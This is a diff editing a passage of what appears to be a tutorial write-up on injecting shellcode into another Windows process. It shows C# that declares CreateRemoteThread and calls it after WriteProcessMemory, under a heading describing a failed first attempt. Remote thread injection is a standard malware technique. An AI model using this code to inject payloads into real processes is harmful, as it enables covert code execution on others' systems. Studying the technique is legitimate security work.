@@ -284,14 +284,14 @@ With our shellcode where we want it, we can now try to introduce and call `Creat
 
 # Fail #1
 
-We make two small updates to the C# code. First, import the function:
+We make two small updates to the C# code:
+
 ```csharp
     [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-```
 
-Then call it, providing the thread entrypoint of the address of the shellcode:
-```csharp
+    ...
+
     ret = WriteProcessMemory(hProcess, WriteAddress, Shellcode, Shellcode.Length, out lpNumberOfBytesWritten);
 
     IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, WriteAddress, IntPtr.Zero, 0, IntPtr.Zero);
